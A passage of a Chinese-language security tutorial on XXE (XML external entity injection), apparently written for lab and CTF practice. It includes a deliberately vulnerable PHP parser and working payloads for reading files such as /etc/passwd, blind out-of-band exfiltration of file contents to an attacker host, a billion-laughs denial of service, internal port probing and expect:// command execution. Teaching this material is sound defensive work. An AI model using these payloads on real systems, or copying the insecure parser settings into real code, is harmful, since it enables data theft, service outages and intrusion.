class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n  &lt;!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  %file;\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时对于这些知识有了一定的了解，就可以来看一下XXE了</p>\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><h2 id=\"什么是XXE\"><a href=\"#什么是XXE\" class=\"headerlink\" title=\"什么是XXE\"></a>什么是XXE</h2><p>XXE漏洞全称XML External Entity Injection ，即xml外部实体注入漏洞。</p>\n<h2 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件。</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>造成文件读取<br>命令执行<br>内网端口扫描<br>攻击内网网站<br>发起dos攻击等危害</p></blockquote>\n<h2 id=\"漏洞成因-1\"><a href=\"#漏洞成因-1\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h2><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>\n<h2 id=\"XXE的利用姿势\"><a href=\"#XXE的利用姿势\" class=\"headerlink\" title=\"XXE的利用姿势\"></a>XXE的利用姿势</h2><h3 id=\"读取任意文件\"><a href=\"#读取任意文件\" class=\"headerlink\" title=\"读取任意文件\"></a>读取任意文件</h3><h4 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h4><p>测试代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$xmlfile</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dom</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$xml</span><span class=\"token operator\">=</span><span class=\"token function\">simplexml_import_dom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dom</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xxe</span><span class=\"token operator\">=</span><span class=\"token variable\">$xml</span><span class=\"token operator\">-></span><span class=\"token property\">xxe</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$str</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$xxe</span></span> \\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对代码的解释如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>获取客户端输入的内容\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>初始化<span class=\"token constant\">XML</span>解析器\n<span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>加载客户端输入的<span class=\"token constant\">XML</span>内容\n<span class=\"token function\">simplexml_import_dom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dom</span><span class=\"token punctuation\">)</span>获取<span class=\"token constant\">XML</span>文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回<span class=\"token constant boolean\">FALSE</span>。\n<span class=\"token variable\">$xxe</span><span class=\"token operator\">=</span><span class=\"token variable\">$xml</span><span class=\"token operator\">-></span><span class=\"token property\">xxe</span><span class=\"token punctuation\">:</span>获取SimpleXMLElement对象中的节点<span class=\"token constant\">XXE</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">:</span>输出<span class=\"token constant\">XXE</span>内容。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>POST上传内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token delimiter important\">?></span></span>  //XML声明\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">xml</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">   //定义xml元素\n&lt;!ENTITY quan9i SYSTEM \"file:///c:/windows/system.ini\"> //定义一般实体quan9i\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>xml</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>xxe</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&quan9i;\">&amp;quan9i;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>xxe</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>xml</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153192.png\" alt=\"在这里插入图片描述\"><br>尝试读取其他文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token delimiter important\">?></span></span>  \n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY quan9i SYSTEM \"file:///d:/flag.txt\"> \n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>xxe</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&quan9i;\">&amp;quan9i;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>xxe</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153188.png\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h4><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$xmlfile</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dom</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$xml</span><span class=\"token operator\">=</span><span class=\"token function\">simplexml_import_dom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dom</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xxe</span><span class=\"token operator\">=</span><span class=\"token variable\">$xml</span><span class=\"token operator\">-></span><span class=\"token property\">xxe</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$str</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$xxe</span></span> \\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> convert <span class=\"token punctuation\">[</span> \n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> remote <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"http://192.168.134.128/eval.xml\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">%</span>remote<span class=\"token punctuation\">;</span><span class=\"token operator\">%</span>payload<span class=\"token punctuation\">;</span><span class=\"token operator\">%</span>send<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>攻击机<code>http://192.168.134.128</code>中<code>eval.xml</code>的内容为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=file:///d:/flag.txt\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> payload <span class=\"token string double-quoted-string\">\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>那么这个思路的话就是先调用remote，其实也就是包含这个攻击机上的文件，然后调用payload参数实体，此时就包含了file这个参数实体，然后此时就会去读取文件，那么此时send的内容就是<code>http://192.168.134.128/?content=文件内容</code>，我们此时调用send，就会得到文件内容<br>简单的说，就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、调用remote<span class=\"token operator\">--</span><span class=\"token operator\">></span>包含<span class=\"token keyword\">eval</span><span class=\"token operator\">.</span>xml\n<span class=\"token number\">2</span>、调用payload<span class=\"token operator\">--</span><span class=\"token operator\">></span>包含file参数实体<span class=\"token operator\">--</span><span class=\"token operator\">></span>读取文件内容<span class=\"token punctuation\">(</span>此时send中就是文件内容了<span class=\"token punctuation\">)</span>\n<span class=\"token number\">3</span>、调用<span class=\"token function\">send</span><span class=\"token punctuation\">(</span>将文件内容取出<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153177.png\" alt=\"在这里插入图片描述\"><br>base64解码一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153186.png\" alt=\"在这里插入图片描述\"><br>这个是把读取文件写在攻击机上了，我们也可以写入本地，像这种<br>构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> convert <span class=\"token punctuation\">[</span> \n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=file:///d:/flag.txt\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> remote <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"http://192.168.134.128/eval.xml\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">%</span>remote<span class=\"token punctuation\">;</span><span class=\"token operator\">%</span>payload<span class=\"token punctuation\">;</span><span class=\"token operator\">%</span>send<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>攻击机上<code>eval.xml</code>的内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> payload <span class=\"token string double-quoted-string\">\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153556.png\" alt=\"在这里插入图片描述\"><br>得到flag</p>\n<h3 id=\"DOS攻击-Denial-of-service\"><a href=\"#DOS攻击-Denial-of-service\" class=\"headerlink\" title=\"DOS攻击(Denial of service)\"></a>DOS攻击(Denial of service)</h3><p>通过XML外部实体注入，攻击者可以发送任意的HTTP请求，因为解析器会解析文档中的所有实体，所以如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。<br>常见的XML恶意代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">lolz</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol</span> <span class=\"token attr-name\">\"dos\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol2</span> <span class=\"token attr-name\">\"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol3</span> <span class=\"token attr-name\">\"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol4</span> <span class=\"token attr-name\">\"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol5</span> <span class=\"token attr-name\">\"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol6</span> <span class=\"token attr-name\">\"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol7</span> <span class=\"token attr-name\">\"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol8</span> <span class=\"token attr-name\">\"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">lol9</span> <span class=\"token attr-name\">\"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"</span><span class=\"token punctuation\">></span></span>\n\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lolz</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&lol9;\">&amp;lol9;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lolz</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>调用<code>lol9</code>实体参数的时候，会调用10个<code>lol8</code>实体参数，而每个<code>lol8</code>实体参数又包含十个<code>lol7</code>参数，此时就已经调用了<code>10^2</code>个参数实体了，往下会更加的多，这个1K不到的文件经过解析后会耗用大量内存，最终会占用到3G的内存,由此可见这个漏洞是十分危险的<br>一般我们可以这样构造来进行DOS攻击</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> data <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ELEMENT</span> <span class=\"token function\">data</span> <span class=\"token punctuation\">(</span><span class=\"token comment\">#ANY)></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> a0 <span class=\"token string double-quoted-string\">\"dos\"</span> <span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> a1 <span class=\"token string double-quoted-string\">\"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> a2 <span class=\"token string double-quoted-string\">\"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>data<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>a2<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>data<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"内网探测\"><a href=\"#内网探测\" class=\"headerlink\" title=\"内网探测\"></a>内网探测</h3><p>当我们获取到一个内网ip地址时，如果有回显，可以在浏览器访问根据访问时间和回显来进行判断<br>存活的端口回显为<code>HTTP request failed!</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153575.png\" alt=\"在这里插入图片描述\"><br>不存活的端口回显位<code>failed to open stream</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153595.png\" alt=\"在这里插入图片描述\"><br>我们也可以利用bp来查看端口是否存活，示例payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY file SYSTEM \"http://10.244.80.20\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&file;\">&amp;file;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>password</span><span class=\"token punctuation\">></span></span>1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>password</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而后利用burpsuite进行爆破，根据回显来判断出端口是否存活<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153643.png\" alt=\"在这里插入图片描述\">说明这个未存活<br>具体操作见下方实战。</p>\n<h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><p>php的expect扩展可以直接执行系统命令，但遗憾的是这个扩展并不是默认安装的。<br>payload参考</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> root<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> cmd <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"expect://id\"</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>dir<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>file<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>cmd<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>file<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>dir<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>file<span class=\"token operator\">></span>uid<span class=\"token operator\">=</span><span class=\"token number\">501</span><span class=\"token punctuation\">(</span>Apple<span class=\"token punctuation\">)</span> gid<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">(</span>staff<span class=\"token punctuation\">)</span> \ngroups<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">(</span>staff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">501</span><span class=\"token punctuation\">(</span>access_bpf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">(</span>everyone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">61</span><span class=\"token punctuation\">(</span>localaccounts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">(</span>_appserverusr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">80</span><span class=\"token punctuation\">(</span>admin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">81</span><span class=\"token punctuation\">(</span>_appserveradm<span class=\"token punctuation\">)</span><span class=\"token 